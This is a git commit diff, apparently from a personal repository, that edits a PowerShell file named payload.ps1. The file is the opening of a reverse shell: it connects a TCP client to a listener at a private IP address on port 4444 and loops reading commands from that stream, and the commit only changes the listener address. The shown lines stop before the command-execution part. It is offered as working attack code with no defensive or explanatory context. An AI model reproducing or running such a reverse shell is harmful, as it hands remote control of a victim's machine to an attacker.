3b798f130f98d1dbb602fba60e709486e7220dea
Mostafa El-Badawy <112512917+mostafa587@users.noreply.github.com>
2025-10-11 03:00:25 +0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444)
+$client = New-Object System.Net.Sockets.TCPClient("192.168.1.8",4444)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
